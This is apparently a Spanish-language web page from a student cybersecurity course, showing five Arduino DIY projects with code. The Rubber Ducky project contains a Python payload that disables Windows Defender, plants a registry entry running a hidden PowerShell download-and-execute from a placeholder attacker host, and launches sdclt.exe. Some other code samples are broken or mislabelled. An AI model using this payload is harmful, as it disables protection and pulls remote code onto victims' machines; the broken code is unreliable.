@@ -1,0 +1,969 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>HYDRA | curso de ciberseguridad</title>
+  <link rel="shortcut icon" href="./images/favicon.png" type="image/x-icon" />
+  <link rel="stylesheet" href="css/responsive.css">
+  <link rel="stylesheet" href="css/style.css">
+  <link rel="stylesheet" href="css/plant1.css">
+  <meta name="theme-color" content="#2091F9" />
+  <meta name="title" content="ciberseguridad " />
+</head>
+
+<body>
+  <header class="hero">
+    <nav class="nav container">
+      <div class="nav__logo">
+        <div class="log">
+          <img src="images/1572962147Hydra Emblem.png" height="86px" width="77px" />
+        </div>
+        <h2 class="nav__title">HYDRA</h2>
+      </div>
+
+      <ul class="nav__link nav__link--menu">
+        <li class="nav__items">
+          <a href="index.html" class="nav__links">inicio</a>
+        </li>
+        <li class="nav__items">
+          <a href="Curso.html" class="nav__links">curso</a>
+        </li>
+        <li class="nav__items">
+          <a href="Contacto.html" class="nav__links">contacto</a>
+        </li>
+        <li class="nav__items">
+          <a href="blog.html" class="nav__links">blog</a>
+        </li>
+        <i class="nav__close">
+          <svg xmlns="http://www.w3.org/2000/svg" width="40px" height="40px" fill="white" class="bi bi-x-circle"
+            viewBox="0 0 16 16">
+            <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16z" />
+            <path
+              d="M4.646 4.646a.5.5 0 0 1 .708 0L8 7.293l2.646-2.647a.5.5 0 0 1 .708.708L8.707 8l2.647 2.646a.5.5 0 0 1-.708.708L8 8.707l-2.646 2.647a.5.5 0 0 1-.708-.708L7.293 8 4.646 5.354a.5.5 0 0 1 0-.708z" />
+          </svg>
+      </ul>
+      </i>
+
+      <div class="nav__menu">
+        <i class="bi bi-justify">
+          <svg xmlns="http://www.w3.org/2000/svg" width="40px" height="40px" fill="white" class="bi bi-list"
+            viewBox="0 0 16 16">
+            <path fill-rule="evenodd"
+              d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z" />
+          </svg>
+        </i>
+      </div>
+    </nav>
+    <section class="hero__container container">
+      <h3 class="hero__title">Seccion informativa sobre tecnologia</h3>
+      <p class="hero__paragraph">¡Corta una cabeza, y dos más tomarán su lugar!</p>
+    </section>
+  </header>
+  <h1>Proyectos DIY con Arduino</h1>
+
+  <div class="project">
+    <h2 class="title">SISTEMA DE SEGURIDAD CON SENSORES MAGNETICOS Y
+      CONTRASEÑA
+    </h2>
+    <img src="images/ard1.png" alt="Previsualización del Proyecto 2" width="450px" class="img1">
+
+    <p>"El sistema de sensores de puertas y ventanas es una solución de seguridad inteligente que protege tu hogar o
+      negocio. Con su tecnología avanzada, monitorea constantemente el estado de tus puertas y ventanas, y te
+      alerta
+      de cualquier intento de intrusión.
+
+      Estos sensores utilizan tecnología magnética para detectar cambios en el campo magnético cuando una puerta o
+      ventana se abre o se cierra. Cuando se detecta una apertura no autorizada, el sistema activa una alarma
+      estridente para disuadir a los intrusos y alertarte de la situación.
+
+      Además, este sistema cuenta con un teclado de interfaz intuitiva que te permite interactuar fácilmente con
+      el
+      sistema. Puedes desactivar la alarma ingresando un código personalizado, lo que te brinda control total
+      sobre la
+      seguridad de tu espacio.
+
+      Ya sea que estés buscando proteger tu hogar, oficina o tienda, el sistema de sensores de puertas y ventanas
+      es
+      una opción confiable y eficaz. Mantén la tranquilidad y la seguridad de tus seres queridos y tus
+      pertenencias
+      con esta solución de seguridad inteligente y fácil de usar."</p>
+    <br>
+    <p class="description">Este proyecto muestra cómo crear una alarma de seguridad utilizando Arduino y un sensor
+      de movimiento.</p>
+
+    <pre class="code">
+      <code>
+        #include <PS2Keyboard.h>
+            #include <Password.h>
+            const int PinDatos = 3;
+            const int PinReloj = 2;
+            const int pinSensor = 5;
+            const int pinAlarma = 6;
+            int valoresDelSensor;
+            bool alarmaSuena = false;
+            bool sistemaActivado = true;
+            PS2Keyboard teclado;
+            //Password password = Password("123");
+            void setup() {
+             delay(1000);
+             teclado.begin(PinDatos, PinReloj);
+             pinMode(pinAlarma,OUTPUT);
+             pinMode(pinSensor, INPUT);
+             Serial.begin(9600);
+             beep(50);
+             beep(50);
+             beep(50);
+            }
+            void loop() {
+            monitorearSeguridad();
+            dispararAlarmaSiSeguridadVulnerada();
+            leerTeclado();
+            }
+            void monitorearSeguridad() {
+             valoresDelSensor = analogRead(pinSensor);
+             if(valoresDelSensor < 1010) {
+             alarmaSuena = true;
+             }
+            }
+            void dispararAlarmaSiSeguridadVulnerada() {
+             if(alarmaSuena && sistemaActivado) {
+             beep(200);
+             }
+            }
+            void leerTeclado(){
+             if(teclado.available()) {
+             char c = teclado.read();
+             if (c == PS2_UPARROW){
+             activarSistema();
+             } else if (c == PS2_DOWNARROW) {
+             desactivarSistema();
+             }
+             }
+            }
+            void desactivarSistema(){
+             alarmaSuena = false;
+             sistemaActivado = false;
+             beep(50);
+             beep(50);
+             beep(50);
+            }
+            void activarSistema() {
+             alarmaSuena = false;
+             sistemaActivado = true;
+             beep(50);
+             beep(50);
+             beep(50);
+            }
+            void beep(unsigned char delayms){
+             analogWrite(pinAlarma, 20); // Almost any value can be used
+            except 0 and 25
+             delay(delayms); // wait for a delayms ms
+             analogWrite(pinAlarma, 0); // 0 turns it off
+             delay(delayms); // wait for a delayms ms
+            }
+      </code>
+    </pre>
+    <div class="enlace"> <a href="https://interorganic.com.ar/josx/alarma.pdf">Más información</a>
+    </div>
+  </div>
+
+  <div class="project">
+    <h2 class="title">Proyecto 2: Un Rubber Ducky hecho sobre Arduino </h2>
+    <img src="images/ruber.jpg" alt="Previsualización del Proyecto 2" width="450px" class="img2">
+    <p>
+      El Rubber Ducky es un microcontrolador (AT32UC3B1256) similar a los utilizados en algunas placas Arduino,
+      como la Leonardo, la Esplora o la Micro, que también utilizan un 32u4. Este microcontrolador tiene
+      bibliotecas que permiten simular clics de ratón y pulsaciones de teclado. Por esta razón, es posible
+      construir un Rubber Ducky utilizando una placa Arduino y cargar diversos "payloads" para experimentar y
+      observar su funcionamiento</p>
+    <br>
+    <p class="description">Descubre el Arduino Rubber Ducky, tu aliado para el hacking. Automatiza tareas, explora
+      vulnerabilidades y aprende sobre ciberseguridad. ¡Potencia tu creatividad con este dispositivo compacto y
+      discreto!"
+    </p>
+    <pre class="code">
+      <code>
+        import subprocess
+
+        # Deshabilitar el monitoreo en tiempo real de Windows Defender
+        command1 = 'powershell -W Hidden -C "Set-MpPreference -DisableRealtimeMonitoring 1"'
+        subprocess.call(command1, shell=True)
+        
+        # Crear una nueva entrada en el registro de Windows
+        registryPath = "Ruta/Al/Registro"
+        name = "NombreDeLaEntrada"
+        value = 'powershell -W Hidden -C "iex (new-object net.webclient).downloadstring(\'metasploit_attacker_machine\')"'
+        command2 = f'powershell New-ItemProperty -Path {registryPath} -Name {name} -Value "{value}" -PropertyType ExpandString -Force Out-Null'
+        subprocess.call(command2, shell=True)
+        
+        # Ejecutar el archivo sdclt.exe
+        command3 = 'sdclt.exe'
+        subprocess.call(command3, shell=True)
+        
+    </code>
+    </pre>
+    <div class="enlace"> <a href="https://www.elladodelmal.com/2017/07/arducky-un-rubber-ducky-hecho-sobre.html">Más
+        información</a>
+    </div>
+  </div>
+
+  <div class="project">
+    <h2 class="title">Proyecto 3: MONITOR DE ENERGÍA ELÉCTRICA CON INTERFACE INALÁMBRICA PARA
+      SISTEMA MONOFÁSICO</h2>
+    <img src="images/Imagen1.jpg" alt="Previsualización del Proyecto 2" width="450px" class="img2">
+    <p>
+      El objetivo es desarrollar un monitor de energía eléctrica inalámbrico para sistemas monofásicos. Este
+      dispositivo permite analizar datos eléctricos en la industria y calcular el calibre del conductor adecuado.
+      Además, puede almacenar datos de voltaje, corriente y potencia en un momento específico, aunque no detecta
+      señales parásitas ni armónicas.
+    </p>
+    <br>
+    <p class="description">Monitoreo de energía eléctrica inalámbrico: Controla, analiza y optimiza tu consumo
+      eléctrico</p>
+    <pre class="code">
+      <code>
+        // INICIO DE PROGRAMA
+        // SE ESCRIBEN LAS LIBRERIAS QUE SERAN USADAS EN EL CODIGO
+        #include "EmonLib.h"
+        #include <Wire.h>
+        #include "RTClib.h"
+        #include <SPI.h>
+        #include <SD.h>
+        #include <LiquidCrystal.h>
+        
+        EnergyMonitor emon1;
+        RTC_DS1307 RTC;
+        LiquidCrystal lcd(12, 11, 5, 4, 3, 2);
+        
+        // SE ASIGNAN NOMBRES A LAS VARIABLES CON LAS QUE SE TRABAJARA
+        long unsigned antes = millis();
+        long unsigned ahora;
+        const int chipSelect = 8;
+        float volt;
+        float Irms;
+        float voltmax = 1;
+        float Irmsmax = 0;
+        int potencia_aparente;
+        int botondatos = 43;
+        int botonmax = 47;
+        int boton_reset = 39;
+        bool estadomax = true;
+        bool estado_anteriormax = true;
+        bool estadodatos = true;
+        bool estado_anteriordatos = true;
+        bool estado_reset = true;
+        bool estado_anterior_reset = true;
+        int a = 0;
+        int b = 0;
+        int c = 0;
+        
+        // SE INICIALIZAN TODOS LOS PROTOCOLOS DE COMUNICACION
+        void setup() {
+          emon1.voltage(2, 130.50, 1.7); // pin de entrada, calibración, phase_shift
+          emon1.current(1, 39.7); // pin de entrada; calibración
+          Wire.begin(); // inicialización reloj
+          RTC.begin();
+        
+          lcd.begin(16, 2);
+          pinMode(31, INPUT_PULLUP); // boton que aisla la sd
+          pinMode(botonmax, INPUT_PULLUP); // boton cambio maximos y lectura de valores
+          pinMode(botondatos, INPUT_PULLUP);
+          pinMode(boton_reset, INPUT_PULLUP); // boton que borra la lcd por 5 segundos para resetearla
+        
+          while (!Serial);
+          Serial.begin(9600);
+        
+          Serial.print("Initializing SD card...");
+          if (!SD.begin(chipSelect)) {
+            Serial.println("Card failed, or not present");
+            return;
+          }
+          Serial.println("card initialized.");
+        }
+        
+        // SE INICIALIZA EL ALGORITMO
+        void loop() {
+          // Tablero de inicialización de usuario
+          if (a == 0 && b == 0) {
+            lcd.clear();
+            lcd.setCursor(0, 0);
+            lcd.print("Press Any button");
+            lcd.setCursor(0, 1);
+            lcd.print("to start ---->");
+          }
+        
+          // Cálculo de energía
+          emon1.calcVI(20, 2000); // Variables de la librería EmonLib para calcular
+          volt = emon1.Vrms;
+          Irms = emon1.Irms;
+          potencia_aparente = volt * Irms;
+        
+          // Lectura de reloj
+          DateTime now = RTC.now();
+          int cont = 0;
+          int start = cont + 1;
+          delay(1000);
+          if (start > 20); {
+            // Almacenamiento en SD
+            String dataString = String(volt) + "," + String(Irms) + "," + String(potencia_aparente) + "," +
+                                String(now.year(), DEC) + "," + String(now.month(), DEC) + "," + String(now.day(), DEC) + "," +
+                                String(now.hour(), DEC) + "," + String(now.minute(), DEC));
+        
+            int interruptor_sd = digitalRead(31); // Botón que permite almacenar los datos en la micro SD
+            if (interruptor_sd == 0) {
+              File dataFile = SD.open("datalog.txt", FILE_WRITE); // Abre un archivo de texto para almacenar los datos leídos
+              if (dataFile) {
+                dataFile.println(dataString);
+                dataFile.close();
+                // Serial.println(dataString); // Se imprime en el puerto serial ya sea para leer por el bluetooth o desde el PC
+              }
+              else {
+                Serial.println("Error opening datalog.txt");
+              }
+            }
+        
+            long unsigned ahora = millis();
+            if (ahora - antes > 1000) {
+              antes = millis();
+              Serial.print("Vrms = ");
+              Serial.println(voltmax);
+              Serial.print("Irms = ");
+              Serial.println(Irmsmax);
+              Serial.print("W = ");
+              Serial.println(voltmax * Irmsmax);
+            }
+        
+            // LCD
+            if (volt > voltmax) {
+              voltmax = volt;
+            }
+            if (Irms > Irmsmax) {
+              Irmsmax = Irms;
+            }
+        
+            estadomax = digitalRead(botonmax);
+            if (estadomax != estado_anteriormax) {
+              delay(20);
+              b = 1;
+              a = 0;
+              estado_anteriordatos = estadodatos;
+            }
+            if (estadomax == HIGH && b == 1) {
+              a = 0;
+            }
+            if (b == 1) {
+              if (voltmax <= 4.2) {
+                voltmax = 0;
+              }
+              if (Irmsmax <= 0.37) {
+                Irmsmax = 0;
+              }
+              lcd.clear();
+              lcd.setCursor(0, 0);
+              lcd.print("MVrms");
+              lcd.setCursor(7, 0);
+              lcd.print("MIrms");
+              lcd.setCursor(13, 0);
+              lcd.print("MW");
+              lcd.setCursor(0, 1);
+              lcd.print(voltmax);
+              lcd.setCursor(7, 1);
+              lcd.print(Irmsmax);
+              lcd.setCursor(12, 1);
+              lcd.print(voltmax * Irmsmax);
+            }
+        
+            estadodatos = digitalRead(botondatos);
+            if (estadodatos != estado_anteriordatos) {
+              delay(20);
+              a = 1;
+              b = 0;
+              estado_anteriordatos = estadodatos;
+            }
+            if (estadodatos == HIGH && a == 1) {
+              b = 0;
+            }
+            if (a == 1) {
+              if (volt <= 5.2) {
+                volt = 0;
+              }
+              if (Irms <= 0.37) {
+                Irms = 0;
+              }
+              if (Irms <= 1.37 && Irms >= 0.6) {
+                Irms = Irms - 0.20;
+              }
+              lcd.clear();
+              lcd.setCursor(0, 0);
+              lcd.print("Vrms");
+              lcd.setCursor(7, 0);
+              lcd.print("Irms");
+              lcd.setCursor(13, 0);
+              lcd.print("W");
+              lcd.setCursor(0, 1);
+              lcd.print(volt);
+              lcd.setCursor(7, 1);
+              lcd.print(Irms);
+              lcd.setCursor(12, 1);
+              lcd.print(volt * Irms);
+            }
+        
+            // Botón de reseteo de LCD
+            estado_reset = digitalRead(boton_reset);
+            if (estado_reset != estado_anterior_reset) {
+              if (estado_reset == HIGH) {
+                volt = 0;
+                Irms = 0;
+                potencia_aparente = 0;
+                voltmax = 0.0;
+                Irmsmax = 0;
+                lcd.clear();
+                lcd.setCursor(0, 0);
+                lcd.print("Vrms");
+                lcd.setCursor(7, 0);
+                lcd.print("Irms");
+                lcd.setCursor(13, 0);
+                lcd.print("W");
+                lcd.setCursor(0, 1);
+                lcd.print(voltmax);
+                lcd.setCursor(7, 1);
+                lcd.print(Irmsmax);
+                lcd.setCursor(13, 1);
+                lcd.print(potencia_aparente);
+                delay(5000);
+              }
+              estado_anterior_reset = estado_reset;
+            }
+        
+            // Tabla de calibre de conductor según corriente medida (solo imprime en el serial)
+            if (Irmsmax <= 0.044 && Irmsmax >= 0) {
+              Serial.println("AWG 35 ");
+            }
+            if (Irmsmax <= 0.056 && Irmsmax >= 0.045) {
+              Serial.println("AWG 34 ");
+            }
+            if (Irmsmax <= 0.072 && Irmsmax >= 0.057) {
+              Serial.println("AWG 33 ");
+            }
+            if (Irmsmax <= 0.091 && Irmsmax >= 0.073) {
+              Serial.println("AWG 32 ");
+            }
+            if (Irmsmax <= 0.113 && Irmsmax >= 0.092) {
+              Serial.println("AWG 31 ");
+            }
+            if (Irmsmax <= 0.142 && Irmsmax >= 0.114) {
+              Serial.println("AWG 30 ");
+            }
+            if (Irmsmax <= 0.182 && Irmsmax >= 0.143) {
+              Serial.println("AWG 29 ");
+            }
+            if (Irmsmax <= 0.226 && Irmsmax >= 0.183) {
+              Serial.println("AWG 28 ");
+            }
+            if (Irmsmax <= 0.288 && Irmsmax >= 0.227) {
+              Serial.println("AWG 27 ");
+            }
+            if (Irmsmax <= 0.361 && Irmsmax >= 0.289) {
+              Serial.println("AWG 26 ");
+            }
+            if (Irmsmax <= 0.457 && Irmsmax >= 0.362) {
+              Serial.println("AWG 25 ");
+            }
+            if (Irmsmax <= 0.577 && Irmsmax >= 0.458) {
+              Serial.println("AWG 24 ");
+            }
+            if (Irmsmax <= 0.729 && Irmsmax >= 0.578) {
+              Serial.println("AWG 23 ");
+            }
+            if (Irmsmax <= 0.92 && Irmsmax >= 0.730) {
+              Serial.println("AWG 22 ");
+            }
+            if (Irmsmax <= 1.2 && Irmsmax >= 0.93) {
+              Serial.println("AWG 21 ");
+            }
+            if (Irmsmax <= 1.5 && Irmsmax >= 1.3) {
+              Serial.println("AWG 20 ");
+            }
+            if (Irmsmax <= 1.8 && Irmsmax >= 1.6) {
+              Serial.println("AWG 19 ");
+            }
+            if (Irmsmax <= 2.3 && Irmsmax >= 1.9) {
+              Serial.println("AWG 18 ");
+            }
+            if (Irmsmax <= 2.9 && Irmsmax >= 2.4) {
+              Serial.println("AWG 17 ");
+            }
+            if (Irmsmax <= 3.7 && Irmsmax >= 3.0) {
+              Serial.println("AWG 16 ");
+            }
+            if (Irmsmax <= 4.6 && Irmsmax >= 3.8) {
+              Serial.println("AWG 15 ");
+            }
+            if (Irmsmax <= 5.8 && Irmsmax >= 4.7) {
+              Serial.println("AWG 14 ");
+            }
+            if (Irmsmax <= 7.3 && Irmsmax >= 5.9) {
+              Serial.println("AWG 13 ");
+            }
+            if (Irmsmax <= 9.2 && Irmsmax >= 7.4) {
+              Serial.println("AWG 12 ");
+            }
+            if (Irmsmax <= 11.6 && Irmsmax >= 9.3) {
+              Serial.println("AWG 11 ");
+            }
+            if (Irmsmax <= 14.6 && Irmsmax >= 11.7) {
+              Serial.println("AWG 10 ");
+            }
+            if (Irmsmax <= 18.5 && Irmsmax >= 14.7) {
+              Serial.println("AWG 9 ");
+            }
+            if (Irmsmax <= 23.3 && Irmsmax >= 18.6) {
+              Serial.println("AWG 8 ");
+            }
+            if (Irmsmax <= 29.3 && Irmsmax >= 23.4) {
+              Serial.println("AWG 7 ");
+            }
+            if (Irmsmax <= 37.0 && Irmsmax >= 29.4) {
+              Serial.println("AWG 6 ");
+            }
+            if (Irmsmax <= 46.7 && Irmsmax >= 37.1) {
+              Serial.println("AWG 5 ");
+            }
+            if (Irmsmax <= 58.8 && Irmsmax >= 46.8) {
+              Serial.println("AWG 4 ");
+            }
+            if (Irmsmax <= 74.0 && Irmsmax >= 58.9) {
+              Serial.println("AWG 3 ");
+            }
+            if (Irmsmax <= 93.3 && Irmsmax >= 74.1) {
+              Serial.println("AWG 2 ");
+            }
+            if (Irmsmax <= 117.4 && Irmsmax >= 93.4) {
+              Serial.println("AWG 1 ");
+            }
+            if (Irmsmax <= 148.0 && Irmsmax >= 117.5) {
+              Serial.println("AWG 0 ");
+            }
+            if (Irmsmax <= 186.5 && Irmsmax >= 148.1) {
+              Serial.println("AWG 00 ");
+            }
+            if (Irmsmax <= 234.5 && Irmsmax >= 186.6) {
+              Serial.println("AWG 000 ");
+            }
+          }
+        }
+      </code>
+    </pre>
+    <div class="enlace"> <a
+        href="https://repositorio.utp.edu.co/server/api/core/bitstreams/009943a8-4ff9-4464-a2e7-43ee5ff28691/content">Más
+        información</a>
+    </div>
+  </div>
+
+  <div class="project">
+    <h2 class="title">Proyecto 4: Prototipo automatizado para control de variables atmosféricas en cultivo de plantas
+      bajo invernadero</h2>
+    <img src="images/inver.PNG" alt="Previsualización del Proyecto 4" width="450px" class="img2">
+    <p>El presente proyecto de grado propone un prototipo de invernadero para el cultivo de plantas
+      comestibles, vegetales y frutos en ambientes indoor (situado dentro de un recinto o bajo cubierta)
+      de forma controlada y automatizada. A través de una tarjeta electrónica ARDUINO, se controla
+      de forma automatizada las variables ambientales más significativas que influyen en el
+      crecimiento de las plantas, tales como, temperatura, humedad del aire, humedad del suelo e
+      iluminación. Asimismo, se desarrolló una aplicación móvil, que permite el monitoreo y control
+      del cultivo o planta en el interior del invernadero</p>
+    <br>
+    <p class="description">En este proyecto, construirás un robot seguidor de línea utilizando Arduino y sensores
+      infrarrojos.</p>
+    <pre class="code">
+      <code>
+        #include "RTClib.h"// Libreria - reloj
+        #include <DHT.h> // Libreria - Temperatura
+        #include <Wire.h> // Libreria - Sensor de Luz
+        
+        RTC_DS1307 RTC;
+        int SensorHum = 9;
+        int fan = 10;
+        int temp, humedad;
+        DHT dht(SensorHum, DHT11);
+        int higrometro = A1;
+        int bomba = 11;
+        long A = 1000; 
+        int B = 15; 
+        int Rc = 10; 
+        int LDRPin = A0; 
+        int LuzPin = 12;
+        int V;
+        int ilum;
+        
+        void setup(){
+         Serial.begin(1000);
+         Wire.begin(); 
+         RTC.begin(); 
+         Serial.begin(9600); 
+        
+         dht.begin();
+        
+         pinMode(higrometro, INPUT);
+         pinMode(bomba, OUTPUT);
+        }
+        
+        void temperatura (){
+         humedad = dht.readHumidity();
+         temp = dht.readTemperature();
+         Serial.print(temp);
+         Serial.print(",");
+         Serial.print(humedad);
+         Serial.print(",");
+        
+         if(temp > 35) {
+         digitalWrite(fan, HIGH);
+         Serial.print("Fan = ON");
+         Serial.print(",");
+         }
+         else {
+         digitalWrite(fan, LOW);
+         Serial.print("Fan = OFF");
+         Serial.print(",");
+         }
+        }
+        
+        void sn () {
+         int nivel = analogRead(sn);
+         if(nivel == HIGH) {
+         digitalWrite(bomba, LOW);
+         }
+         else {
+         void higro () {
+         int humedad = analogRead(higrometro);
+         int hr = map(humedad, 0, 1023, 100, 0);
+         Serial.print(hr);
+         Serial.print(",");
+         if(hr < 60) {
+         digitalWrite(bomba, HIGH);
+         Serial.print("Bomba = ON");
+         Serial.print(",");
+         }
+         else {
+         digitalWrite(bomba, LOW);
+         Serial.print("Bomba = OFF");
+         Serial.print(",");
+         }
+         }
+        }
+        
+        void luz (){
+         V = analogRead(LDRPin);
+         ilum = ((long)V*A*10)/((long)B*Rc*(1024-V));
+         Serial.print(ilum);
+         Serial.print(",");
+        
+         if (ilum < 15) {
+         digitalWrite(LuzPin, HIGH);
+         Serial.println("Luces = ON");
+         }
+         else {
+         digitalWrite(LuzPin, LOW);
+         Serial.println("Luces = OFF");
+         }
+         delay(3000);
+        }
+        
+        void loop(){
+         DateTime now = RTC.now();
+         Serial.print("Dia de la semana: ");
+         Serial.println(now.dayOfWeek(), DEC);
+        
+         if (now.dayOfWeek() == 1) Serial.println("Lunes"); 
+         if (now.dayOfWeek() == 2) Serial.println("Martes");
+         if (now.dayOfWeek() == 3) Serial.println("Miércoles");
+         if (now.dayOfWeek() == 4) Serial.println("Jueves");
+         if (now.dayOfWeek() == 5) Serial.println("Viernes");
+         if (now.dayOfWeek() == 6) Serial.println("Sábado");
+         if (now.dayOfWeek() == 7) Serial.println("Domingo");
+         Serial.println();
+        
+         Serial.print("Fecha:");
+         Serial.print(now.year(), DEC);
+         Serial.print('/');
+         Serial.print(now.month(), DEC);
+         Serial.print('/');
+         Serial.print(now.day(), DEC);
+         Serial.print(' ');
+         Serial.print("Hora:");
+         Serial.print(now.hour(), DEC);
+         Serial.print(':');
+         Serial.print(now.minute(), DEC);
+         Serial.print(':');
+         Serial.print(now.second(), DEC);
+         Serial.println();
+        
+         if ((now.hour() >= 7) && (now.hour() <= 20)){
+         temperatura();
+         }
+         if ((now.hour() >= 7) && (now.hour() <= 20)){
+         higro();
+         }
+         if ((now.hour() >= 7) && (now.hour() <= 20)){
+         luz();
+         delay(3000);
+         }
+        }
+              </code>
+    </pre>
+    <div class="enlace"> <a
+        href="https://repositorio.cuc.edu.co/bitstream/handle/11323/6072/Elaboraci%C3%B3n%20del%20prototipo%20de%20un%20sistema%20de%20control%20de%20variables%20atmosf%C3%A9ricas%20automatizado%20para%20el%20cultivo%20de%20plantas%20bajo%20invernadero%20en%20ambiente%20indoor%20en%20la%20Regi%C3%B3n%20Caribe.pdf?sequence=1&isAllowed=y">Más
+        información</a>
+    </div>
+  </div>
+
+  <div class="project">
+    <h2 class="title">Proyecto 5: SISTEMA DE ALIMENTACION AUTOMATICO PARA MASCOTAS DOMESTICAS</h2>
+    <img src="images/disp.PNG" alt="Previsualización del Proyecto 4" width="450px" class="img2">
+    <p>El dosificador es una herramienta la cual al ahorrar tiempo para sus dueños al no tener la obligación de estar
+      alimentando directamente su mascota generara mucho menos estrés, tranquilidad, confianza y seguridad de que su
+      mascota se está alimentando de una manera correcta, ya que podrá monitorear y controlar la alimentación por medio
+      de una aplicación instalada en un Smartphone. Dicha aplicación también tendrá la capacidad de notificar al usuario
+      las fechas de vacunación y desparasitación de su mascota. En cuanto a la mascota, mejorara su calidad de vida
+      siendo más activo y enérgico, también al evitar enfermedades su promedio de vida se extenderá.</p>
+    <br>
+    <p class="description">El codigo se encuentra incompleto ya que es algo extenso por lo que se recomienda revisar la
+      <a href="https://red.uao.edu.co/bitstream/handle/10614/12240/T09103.pdf?sequence=5&isAllowed=y">
+        documentacion </a> ahi se encuentra todo el contenido
+    </p>
+    <pre class="code">
+      <code>
+        #include "Controller.h"
+        Controller controller;
+        
+        void setup() {
+          controller.initComponents(9600);
+        }
+        
+        void loop() {
+          controller.runActions();
+        }
+   
+        
+        #include <ArduinoJson.h>
+          #include <Ethernet.h>
+          #include <SPI.h>
+          
+          class ApiServer {
+          private:
+            EthernetClient client;
+            int response;
+            int mealTime;
+            double weight;
+            String errorMessage;
+            bool connection;
+            int deviceID;
+            String currentTime;
+            float currentStorage;
+            float currentPlate;
+            int limitError = 1;
+            int numError = 0;
+          
+            bool prepareClient() {
+              while (!Serial) continue;
+          
+              byte mac[] = {0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED};
+              if (Ethernet.begin(mac) == 0) {
+                Serial.println(F("Fallo la configuración Ethernet DHCP"));
+                return false;
+              }
+              Serial.print("localIP: ");
+              Serial.println(Ethernet.localIP());
+              delay(1000);
+              Serial.println(F("Conectando..."));
+              
+              client.setTimeout(10000);
+              if (!client.connect("carepet.hydra-id.com", 80)) {
+                Serial.println(F("Conexión fallida"));
+                return false;
+              }
+              Serial.println(F("Conectado!"));
+              return true;
+            }
+          
+            bool getResponse() {
+              client.print("GET /?action=1001&device=");
+              client.print(deviceID);
+              client.print("&currentTime=");
+              client.print(currentTime);
+              client.print("&storage=");
+              client.print(currentStorage);
+              client.print("&plate=");
+              client.print(currentPlate);
+              client.println(" HTTP/1.1");
+              client.println(F("Host: carepet.hydra-id.com"));
+              client.println(F("Connection: close"));
+              
+              if (client.println() == 0) {
+                Serial.println(F("Failed to send request"));
+                return false;
+              }
+          
+              char status[32] = {0};
+              client.readBytesUntil('\r', status, sizeof(status));
+              if (strcmp(status, "HTTP/1.1 200 OK") != 0) {
+                Serial.print(F("Unexpected response: "));
+                Serial.println(status);
+                return false;
+              }
+              
+              char endOfHeaders[] = "\r\n\r\n";
+              if (client.find(endOfHeaders) != 1) {
+                Serial.println(F("Invalid response"));
+                return false;
+              }
+              
+              const size_t capacity = JSON_OBJECT_SIZE(3) + JSON_ARRAY_SIZE(2) + 60;
+              DynamicJsonDocument doc(capacity);
+              DeserializationError error = deserializeJson(doc, client);
+              
+              if (error) {
+                Serial.print(F("deserializeJson() failed: "));
+                Serial.println(error.c_str());
+                return false;
+              }
+              
+              client.stop();
+              response = doc["response"].as<int>();
+              
+              if (response == 1) {
+                mealTime = doc["mealTime"].as<int>();
+                weight = doc["weight"].as<double>();
+                return true;
+              }
+              else {
+                errorMessage = doc["error"].as<String>();
+                return false;
+              }
+            }
+          
+          public:
+            void initComponents(int deviceID) {
+              connection = false;
+              this->deviceID = deviceID;
+            }
+          
+            bool isConnecting() {
+              return this->connection;
+            }
+          
+            int getMealTime() {
+              return this->mealTime;
+            }
+          
+            double getFoodPortion() {
+              return this->weight;
+            }
+          
+            void setCurrentTime(String cTime) {
+              this->currentTime = cTime;
+              Serial.println("current time: " + cTime);
+            }
+          
+            void setCurrentStorage(float storage) {
+              this->currentStorage = storage;
+              Serial.print("current storage: ");
+              Serial.println(storage);
+            }
+          
+            void setCurrentPlate(float plate) {
+              this->currentPlate = plate;
+              Serial.print("current plate: ");
+              Serial.println(plate);
+            }
+          
+            bool syncDataServer() {
+              connection = true;
+          
+              if (!prepareClient()) {
+                connection = false;
+                numError++;
+                Serial.print("ERROR[");
+                Serial.print(numError);
+                Serial.println("]: conectando a internet");
+                
+                if (numError == limitError) {
+                  delay(1000);
+                  numError = 0;
+                  Serial.println("server reseted");
+                }
+                return false;
+              }
+          
+              if (!getResponse()) {
+                Serial.println("ERROR: conectando al servidor");
+                connection = false;
+                delay(3000);
+                return false;
+              }
+          
+              bool success = true;
+              if (response != 1) success = false;
+              connection = false;
+              return success;
+            }
+          };
+        </code>
+    </pre>
+
+  </div>
+
+  <footer class="footer">
+    <section class="footer__container container">
+      <nav class="nav nav--footer">
+        <h2 class="footer__title">Curso ciberseguridad</h2>
+
+        <ul class="nav__link nav__link--footer">
+          <li class="nav__items">
+            <a href="index.html" class="nav__links">Inicio</a>
+          </li>
+          <li class="nav__items">
+            <a href="Curso.html" class="nav__links">Curso</a>
+          </li>
+          <li class="nav__items">
+            <a href="Contacto.html" class="nav__links">Contacto</a>
+          </li>
+          <li class="nav__items">
+            <a href="blog.html" class="nav__links">blog</a>
+          </li>
+        </ul>
+      </nav>
+
+      <form class="footer__form" action="https://formspree.io/f/xgeqjgob" method="POST">
+        <div class="footer__inputs">
+          <input type="email" placeholder="Email:" class="footer__input" name="_replyto" />
+          <input type="submit" value="Registrate" class="footer__submit" />
+        </div>
+      </form>
+    </section>
+
+    <section class="footer__copy container">
+      <div class="footer__social">
+        <a href="https://es-la.facebook.com/login/device-based/regular/login/" class="footer__icons"><img
+            src="./images/facebook.svg" class="footer__img" /></a>
+        <a href="https://twitter.com/?lang=es" class="footer__icons"><img src="./images/twitter.svg"
+            class="footer__img" /></a>
+        <a href="https://www.youtube.com/channel/UClhiamF43q-SBILHOA3Ydlg " class="footer__icons"><img
+            src="./images/youtube.svg" class="footer__img" /></a>
+        <a href="https://sena.territorio.la/cms/index.php" class="footer__icons"><img
+            src="images/sena-colombia-logo.svg" class="footer__img" /></a>
